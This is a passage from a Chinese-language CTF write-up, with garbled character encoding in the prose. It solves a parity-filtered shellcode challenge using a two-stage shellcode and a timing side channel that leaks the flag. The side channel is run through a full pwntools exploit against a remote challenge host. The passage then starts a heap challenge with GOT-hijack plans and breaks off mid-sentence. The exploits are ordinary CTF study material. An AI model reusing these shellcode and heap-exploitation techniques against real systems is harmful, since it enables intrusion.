ˆä¸Šå·²æœ‰çš„å†…å®¹å’Œå¯„å­˜å™¨ä¸­å·²æœ‰çš„å†…å®¹ï¼ˆpopå’ŒpushæŸä¸ªå¯„å­˜å™¨éƒ½æ˜¯ä¸€å­—èŠ‚çš„æŒ‡ä»¤ï¼Œä¸åŒå¯„å­˜å™¨å¥‡å¶æ€§è´¨ä¸åŒï¼Œå¾ˆå®¹æ˜“æ»¡è¶³é™åˆ¶çš„è¦æ±‚ï¼‰ã€‚</p><p><img src="https://bu.dusays.com/2024/04/26/662b4982d0c82.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/04/26/662b4982d0c82.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="stack"></p><p><img src="https://bu.dusays.com/2024/04/26/662b498f4cbe9.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/04/26/662b498f4cbe9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="stack"></p><p>rspçš„æœ€é¡¶ç«¯æ˜¯è¿”å›åœ°å€å³<code>main+0xc4</code>ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªåœ°å€popåˆ°raxï¼Œç„¶åå¯¹raxè¿›è¡Œxoræ“ä½œï¼Œå¯ä»¥å¾—åˆ°read@pltï¼Œæ–¹ä¾¿åç»­è°ƒç”¨readåº“å‡½æ•°ã€‚æœ‰äº†è¿™ä¸ªæ€è·¯ï¼Œæˆ‘ä»¬å°±éœ€è¦å¸ƒç½®å¥½readçš„å‚æ•°ã€‚rdiç°åœ¨æ°å¥½æ˜¯0ï¼Œç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ï¼Œä¸å»ä¿®æ”¹ã€‚rsiä¹Ÿæ˜¯è¾“å…¥çš„èµ·å§‹åœ°å€ä¸éœ€è¦ä¿®æ”¹ã€‚rdxéœ€è¦ä¿®æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦è¾“å…¥çš„é•¿åº¦ï¼Œç»è¿‡è§‚å¯Ÿrsp+0x8å¤„çš„ä½8ä½æ­£å¥½æ˜¯æˆ‘ä»¬ä¸€é˜¶æ®µè¾“å…¥çš„é•¿åº¦ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦å°†rsp+0x8çš„ä½8ä½å€¼æ”¾åˆ°rdxä¸­å»å³å¯ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pop rax</span><br><span class="line">pop rbx</span><br><span class="line">nop</span><br><span class="line">xor edx, ebx</span><br><span class="line">pop rbx</span><br><span class="line">xor ax, 0x03e6</span><br><span class="line">xor ax, 0x100</span><br><span class="line">sub al, 1</span><br></pre></td></tr></tbody></table></figure><p>è¿™æ ·å°±å·²ç»å°†read@pltæ”¾åˆ°äº†raxé‡Œé¢ï¼Œå¹¶å¸ƒç½®å¥½äº†rdi, rsi å’Œ rdxã€‚æ¥ä¸‹æ¥çš„é—®é¢˜å°±æ˜¯å¦‚ä½•è°ƒç”¨raxä¸­å­˜å‚¨çš„å‡½æ•°ã€‚å·²çŸ¥jmpçš„é•¿è·³è½¬ã€callã€retã€syscalléƒ½ä¸ç¬¦åˆè¿™é“é¢˜çš„è¿‡æ»¤è¦æ±‚ã€‚æ€ä¹ˆåŠï¼Ÿæƒ³èµ·ä¹‹å‰ç”¨ROPgadgetçš„æ—¶å€™çœ‹åˆ°ret{num}è¿™ç§å½¢å¼çš„æŒ‡ä»¤ï¼Œå»æœäº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯retä¹‹åï¼Œä»¤rspå¢åŠ numå­—èŠ‚ã€‚å­—èŠ‚ç æ˜¯ï¼š<code>b'\xc2\x01\x00'</code>æ­£å¥½æ»¡è¶³è¦æ±‚ã€‚ä½†æ˜¯åˆå‡ºç°ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼š</p><p>æ ˆæŒ‡é’ˆå¢é•¿å¥‡æ•°ä¸ªå­—èŠ‚åï¼Œæˆ‘ä»¬å°±æ— æ³•æ§åˆ¶è¿”å›åœ°å€äº†ã€‚</p><p>å› æ­¤æƒ³åˆ°ï¼Œå¦‚æœåœ¨ret {num}ä¹‹å‰å…ˆè®©æ ˆå¢é•¿æˆ–è€…å‡å°‘å¥‡æ•°å­—èŠ‚ï¼Œè€Œä¸”è¿™ä¸ªå‘½ä»¤èƒ½å¤Ÿé€šè¿‡è¿‡æ»¤ï¼Œå°±èƒ½è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æœç´¢å‘ç°æœ‰ä¸€ä¸ªenteræŒ‡ä»¤ï¼š</p><p><code>enter</code>æŒ‡ä»¤çš„å®Œæ•´æ ¼å¼æ˜¯:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enter bytes, level</span><br></pre></td></tr></tbody></table></figure><p>å…¶ä¸­:</p><ol><li><code>bytes</code>æ˜¯ä¸€ä¸ªç«‹å³æ•°,è¡¨ç¤ºå½“å‰å‡½æ•°éœ€è¦åœ¨æ ˆä¸Šåˆ†é…çš„ç©ºé—´å¤§å°(ä»¥å­—èŠ‚ä¸ºå•ä½)ã€‚è¿™ä¸ªå€¼é€šå¸¸å°±æ˜¯å‡½æ•°å†…å±€éƒ¨å˜é‡æ‰€éœ€çš„å¤§å°ã€‚</li><li><code>level</code>æ˜¯å¦ä¸€ä¸ªç«‹å³æ•°,è¡¨ç¤ºåµŒå¥—å‡½æ•°è°ƒç”¨çš„å±‚æ•°ã€‚é€šå¸¸è¿™ä¸ªå€¼ä¸º 0ã€‚</li></ol><p>æˆ‘è¿™é‡Œç”¨ä¸€ä¸ª<code>enter 0x1, 0x3</code>ï¼Œlevelæ˜¯æˆ‘éšä¾¿æŒ‡å®šçš„ï¼Œåœ¨gdbé‡Œé¢çœ‹æ•ˆæœï¼š</p><p><img src="https://bu.dusays.com/2024/04/26/662b49a1ded5e.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/04/26/662b49a1ded5e.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="before_enter"></p><p><img src="https://bu.dusays.com/2024/04/26/662b49af0971c.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/04/26/662b49af0971c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="after_enter"><br>æ ˆæŒ‡é’ˆå‡å°‘äº†0x21å­—èŠ‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†ç”¨ret 9å°±å¯ä»¥è®©æ ˆé‡æ–°å’Œ8å­—èŠ‚å¯¹é½ï¼Œåœ¨é‚£ä¹‹å‰å…ˆæŠŠread@pltçš„åœ°å€pushå…¥æ ˆï¼Œretçš„æ—¶å€™æ‰èƒ½è¿”å›åˆ°readï¼Œç­‰åé¢æ ˆæŒ‡é’ˆå¢åŠ å’Œ8å­—èŠ‚å¯¹é½çš„æ—¶å€™å¯ä»¥è¿”å›åˆ°æˆ‘ä»¬åœ¨enterä¹‹å‰pushå…¥æ ˆçš„shellcodeåœ°å€ã€‚</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nop</span><br><span class="line">push rbx</span><br><span class="line">push rax</span><br><span class="line">push rbx</span><br><span class="line">push rax</span><br><span class="line">push rbx</span><br><span class="line">enter 0x1, 0x3</span><br><span class="line">nop</span><br><span class="line">pop rbx</span><br><span class="line">push rax</span><br><span class="line">push rbx</span><br><span class="line">nop</span><br><span class="line">pop rbx</span><br><span class="line">ret 0x0009</span><br><span class="line">pop rbx</span><br></pre></td></tr></tbody></table></figure><p>è‡³æ­¤ç¬¬ä¸€é˜¶æ®µå°±æ„é€ å®Œæˆäº†ï¼Œç¬¬äºŒé˜¶æ®µçš„shellcodeå°±æ˜¯open(â€˜flagâ€™, 0)ç„¶åreadç¬¬iä¸ªç´¢å¼•å¤„çš„å­—èŠ‚ï¼Œä¸å„ä¸ªå¯è§å­—ç¬¦è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰å°±æ­»å¾ªç¯ï¼Œé€šè¿‡æ—¶é—´åˆ¤æ–­æ˜¯å¦å‘½ä¸­ï¼Œé€å­—èŠ‚çˆ†ç ´åˆ°<code>}</code>ä¸ºæ­¢ï¼Œå®Œæ•´expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># no write for us</span></span><br><span class="line"><span class="comment"># defeat seccomp reference: https://tttang.com/archive/1447/#toc_wirte</span></span><br><span class="line"><span class="comment"># by pass shellcode check reference: </span></span><br><span class="line"><span class="comment"># - https://www.roderickchan.cn/zh-cn/2022-04-30-angstromctf-pwn/</span></span><br><span class="line"><span class="comment"># - https://ctftime.org/writeup/33656</span></span><br><span class="line"><span class="comment"># - https://hackmd.io/@DJRcJnpzRDK3J_8-dhv_dA/rycDEyFSq#parity</span></span><br><span class="line"><span class="comment"># - https://www.aynakeya.com/ctf-writeup/2022/angstrom/pwn/parity/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = context.binary = ELF(<span class="string">'./shellcode'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'critical'</span></span><br><span class="line"></span><br><span class="line">shellcode1_part1 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    pop rbx</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    xor edx, ebx</span></span><br><span class="line"><span class="string">    pop rbx</span></span><br><span class="line"><span class="string">    xor ax, 0x03e6</span></span><br><span class="line"><span class="string">    xor ax, 0x100</span></span><br><span class="line"><span class="string">    sub al, 1</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">shellcode1_part2 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    enter 0x1, 0x3</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    pop rbx</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    pop rbx</span></span><br><span class="line"><span class="string">    ret 0x0009</span></span><br><span class="line"><span class="string">    pop rbx</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">shellcode1 = shellcode1_part1 + shellcode1_part2</span><br><span class="line">lenth = <span class="built_in">len</span>(shellcode1)</span><br><span class="line">padding_times = <span class="built_in">int</span>((<span class="number">0x200</span> - lenth) / <span class="number">2</span>)</span><br><span class="line">padding = <span class="string">b'\x90\x61'</span> * padding_times</span><br><span class="line">shellcode1 = shellcode1 + padding</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(shellcode1):</span><br><span class="line">    <span class="comment"># if c &gt;= 0b10000000:</span></span><br><span class="line">    <span class="comment">#     log.info("bad byte %s at index %d" % (hex(c), i))</span></span><br><span class="line">    <span class="comment">#     log.error(shellcode1)</span></span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span> != c &amp; <span class="number">1</span>:</span><br><span class="line">        log.info(<span class="string">"bad byte %s at index %d"</span> % (<span class="built_in">hex</span>(c), i))</span><br><span class="line">        log.error(shellcode1)</span><br><span class="line">    <span class="keyword">if</span> c &amp; <span class="number">1</span> == <span class="number">1</span> <span class="keyword">and</span> c &gt; <span class="number">0x80</span>:</span><br><span class="line">        log.info(<span class="string">"negative byte %s at index %d"</span> % (<span class="built_in">hex</span>(c), i))</span><br><span class="line">        log.error(shellcode1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># we need brute force every byte of flag</span></span><br><span class="line"><span class="comment"># the seach space is 0x20 ~ 0x7e</span></span><br><span class="line">search_space = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7e</span>)]</span><br><span class="line"></span><br><span class="line">flag_probable_len = <span class="number">0x40</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_probable_len):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> search_space:</span><br><span class="line">        <span class="comment"># p = process(binary.path)</span></span><br><span class="line">        p = remote(<span class="string">'111.186.57.85'</span>,<span class="number">40245</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b'Please input your shellcode: \n'</span>)</span><br><span class="line">        <span class="comment">### stage1: call a read syscall to read shellcode</span></span><br><span class="line">        p.send(shellcode1)</span><br><span class="line">        <span class="comment">### stage2: fuck yeah! we can send shellcode without limitation now</span></span><br><span class="line">        <span class="comment"># but we have no write</span></span><br><span class="line">        <span class="comment"># so we have to use ways like side channel</span></span><br><span class="line">        shellcode2 = asm(<span class="string">f'''</span></span><br><span class="line"><span class="string">        lea rdi, [rip+flag]</span></span><br><span class="line"><span class="string">        mov rsi, 0</span></span><br><span class="line"><span class="string">        mov rax, 2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        mov rdx, 0x100</span></span><br><span class="line"><span class="string">        mov rax, 0</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        loop:</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        xor rbx, rbx</span></span><br><span class="line"><span class="string">        mov al, byte ptr[rsp+<span class="subst">{i}</span>]</span></span><br><span class="line"><span class="string">        mov bl, <span class="subst">{ch}</span></span></span><br><span class="line"><span class="string">        cmp al, bl</span></span><br><span class="line"><span class="string">        je loop</span></span><br><span class="line"><span class="string">        flag:</span></span><br><span class="line"><span class="string">            .string "./flag"</span></span><br><span class="line"><span class="string">        '''</span>)</span><br><span class="line">        shellcode2 += <span class="string">b'\x90'</span> * (<span class="number">0x200</span> - <span class="built_in">len</span>(shellcode2))</span><br><span class="line">        p.send(shellcode2)</span><br><span class="line">        <span class="comment"># learned from changcheng cup...</span></span><br><span class="line">        p.shutdown(<span class="string">'send'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># now if ch is the right byte, the program will be in a dead loop</span></span><br><span class="line">        <span class="comment"># otherwise the program will die</span></span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if p.poll() == None:</span></span><br><span class="line">        <span class="comment">#     flag += chr(ch)</span></span><br><span class="line">        <span class="comment">#     print("flag is now: ", flag)</span></span><br><span class="line">        <span class="comment">#     p.close()</span></span><br><span class="line">        <span class="comment">#     break</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     p.close()</span></span><br><span class="line">        <span class="comment">#     continue</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            detection = p.fileno()</span><br><span class="line">            p.recv(timeout=<span class="number">0.1</span>)</span><br><span class="line">            flag += <span class="built_in">chr</span>(ch)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"flag is now: "</span>, flag)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag[:-<span class="number">1</span>] == <span class="string">'}'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>flag:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0ops{practice_handwrite_shellcode}</span><br></pre></td></tr></tbody></table></figure></li></ol><h3 id="flat"><a href="#flat" class="headerlink" title="flat"></a>flat</h3><p>æœ¬é¢˜çš„è€ƒå¯Ÿç‚¹æ˜¯deflatå»æ··æ·†å’ŒtcacheåŠ«æŒã€‚</p><p>å…¶å®é¢˜ç›®å¯¹deflatçš„æç¤ºå¾ˆæ˜æ˜¾ï¼Œä½†æ˜¯æˆ‘ä¸€å¼€å§‹æ²¡å¾€è¿™æ–¹é¢å‘ï¼Œç›´åˆ°å‡ºflagæ‰çŸ¥é“è¦ç”¨deflatï¼Œä¸€å¼€å§‹æ˜¯è‡ªå·±æ‰‹åŠ¨å»æ··æ·†çš„ï¼š</p><p>å…ˆçœ‹æ˜ç™½äº†æ¯ç§æ“ä½œå¯¹åº”ä¸€ä¸ªopcodeï¼Œç„¶åæ‰¾<code>==</code>ï¼Œç„¶åæ ¹æ®<code>i=xxxxx</code>å»æ‰¾case<code>xxxxx</code>ï¼Œæœ‰ifçš„å°±çŒœæµ‹å¯èƒ½æ˜¯å¯¹ä»€ä¹ˆè¿›è¡Œåˆ¤æ–­ï¼ˆæ¯”å¦‚ç´¢å¼•ã€sizeï¼‰ï¼Œç„¶åé€‰ä¸€ä¸ªiå»æ‰¾caseâ€¦â€¦æœ€åç¡¬æ˜¯æŠŠç¨‹åºçš„ä¸»è¦é€»è¾‘é€†å‘å‡ºæ¥äº†ï¼š</p><ul><li><p>48879: é€€å‡ºç¨‹åº</p></li><li><p>4112ï¼šå †å—å†™ï¼Œä½†æ˜¯æœ€åä¸€ä½ç”±ç¨‹åºç½®é›¶ï¼ˆedit_0_endï¼‰</p><p>e.g. edit_0_end(index, payload)</p><p>ä¼šå¯¹indexæ‰€å¯¹åº”ä½ç½®çš„sizeå’Œaddressåšéç©ºæ£€æŸ¥ï¼Œä¸”0&lt;=index&lt;31ï¼Œpayloadçš„é•¿åº¦å®é™…ä¸Šæœ€å¤šæ¯”sizeå°‘1ï¼Œæœ€åä¸€å­—èŠ‚ä¼šè¢«ç½®0</p></li><li><p>768: malloc</p><p>e.g. malloc(index, size, payload)</p><p>ä¼šå¯¹indexæ‰€å¯¹åº”ä½ç½®çš„sizeå’Œaddressåšéç©ºæ£€æŸ¥ï¼Œä¸”0&lt;=index&lt;31ï¼Œpayloadçš„é•¿åº¦å®é™…ä¸Šæœ€å¤šæ¯”sizeå°‘1ï¼Œæœ€åä¸€å­—èŠ‚ä¼šè¢«ç½®0</p></li><li><p>2989: å †å—å†™ï¼ˆeditï¼‰</p><p>e.g. edit(index, payload)</p><p>ä¼šå¯¹indexæ‰€å¯¹åº”ä½ç½®çš„sizeå’Œaddressåšéç©ºæ£€æŸ¥ï¼Œä¸”0&lt;=index&lt;31ï¼Œpayloadçš„é•¿åº¦æ°å¥½ç­‰äºsize</p></li><li><p>4919: free</p><p>e.g.free(index)</p><p>ä¼šæ£€æŸ¥0&lt;=inex&lt;31ï¼Œæ£€æŸ¥addresså¤„æ˜¯å¦å·²ç»ä¸ºç©ºï¼Œç„¶åå°†å¯¹åº”addresså’Œsizeéƒ½ç½®é›¶ã€‚</p></li><li><p>57005: å †å—è¯»ï¼ˆputsï¼‰</p><p>ä¼šå¯¹indexæ‰€å¯¹åº”ä½ç½®çš„sizeå’Œaddressåšéç©ºæ£€æŸ¥ï¼Œä¸”0&lt;=index&lt;31ï¼Œç„¶åputså †å—å†…å®¹</p></li></ul><p>ä½†æ˜¯è¿™é‡Œçš„0æˆªæ–­å¹¶æ²¡æœ‰off-by-nullæ¼æ´ï¼Œåœ¨how2heapæ‰¾äº†åŠå¤©æ‰¾ä¸åˆ°åˆ©ç”¨æ–¹æ³•ã€‚äºæ˜¯åœ¨gdbé‡Œå…ˆè¯•ç€ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = context.binary = ELF(<span class="string">'./flat'</span>)</span><br><span class="line">libc = binary.libc</span><br><span class="line"></span><br><span class="line">p = binary.process()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index, size, data</span>):</span><br><span class="line">    p.sendline(<span class="string">b'768'</span>) </span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">b'4919'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, data</span>):</span><br><span class="line">    p.sendline(<span class="string">b'2989'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_0_end</span>(<span class="params">index, data</span>):</span><br><span class="line">    p.sendline(<span class="string">b'4112'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">b'57005'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    <span class="keyword">return</span> p.recvline().strip()</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>, <span class="string">b'a'</span>)</span><br><span class="line">edit(<span class="number">0</span>, cyclic(<span class="number">0x100</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x100</span>, <span class="string">b'b'</span>)</span><br><span class="line">edit(<span class="number">1</span>, cyclic(<span class="number">0x100</span>))</span><br></pre></td></tr></tbody></table></figure><p>å‘ç°malloä¸ªä¸¤æ¬¡0x100å¤§å°çš„å †å—ç¨‹åºå°±é€€å‡ºäº†ï¼Œäºæ˜¯åœ¨ç¬¬ä¸€æ¬¡åé¢æŠŠgdbé™„ä¸Šå»ï¼š</p><p><img src="https://bu.dusays.com/2024/04/26/662b49ca08bb4.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/04/26/662b49ca08bb4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="PoC"></p><p>ååˆ†ç¦»è°±â€¦â€¦æˆ‘åˆ°ç°åœ¨ä¹Ÿæ²¡å¼„æ˜ç™½è¿™ä¸ªæ¼æ´æ˜¯å“ªé‡Œæ¥çš„ã€‚</p><p>æ¢æˆ0x80åŠä»¥ä¸‹ä¼¼ä¹å°±æ²¡è¿™ç§æƒ…å†µ,0x90çš„æ—¶å€™é“¾è¡¨æœ‰ä¸¤ä¸ªå€¼ï¼Œåˆ†åˆ«æ˜¯æˆ‘ä»¬è¾“å…¥çš„0x80å¤„å’Œ0x88å¤„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åœ¨0x80å’Œ0x88å¤„å†™ä¸Šåˆæ³•çš„åœ°å€ï¼Œä¸‹ä¸€æ¬¡mallocç›¸åº”å¤§å°çš„chunkå°±èƒ½æ§åˆ¶æˆ‘ä»¬è¾“å…¥çš„åœ°å€ã€‚</p><p>checksecä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br><span class="line">RUNPATH:  b'.'</span><br></pre></td></tr></tbody></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨éœ€è¦åšçš„å°±å¾ˆæ¸…æ™°ï¼š</p><ol><li>leak libc</li><li>got hijacking</li><li>get shell</li></ol><p>é¦–å…ˆï¼Œå‡†å¤‡å¥½ç”¨äºleakå’ŒåŠ«æŒçš„å †å—ï¼Œä»¥åŠå†™æœ‰<code>/bin/sh</code>çš„å †å—ï¼›ç„¶åmallocä¸€ä¸ªå¯ç”¨å¤§å°ä¸º0x90çš„å †å—ï¼Œmallocä¸€ä¸ªå¯ç”¨å¤§å°ä¸º0x330ï¼ˆå®é™…å¤§å°ä¸º0x340ï¼‰çš„å †å—å¹¶freeæ‰ï¼Œä½¿å¾—tcacheçš„0x340å¤§å°é“¾è¡¨æœ‰ä¸€é¡¹ã€‚ç„¶åå¾€0x90å¤§å°çš„å †å—é‡Œé¢å¡«æ»¡<code>heap_manager</code>åœ°å€ï¼ˆä¹Ÿå°±æ˜¯è¯¥ç¨‹åºç”¨æ¥ç®¡ç†å 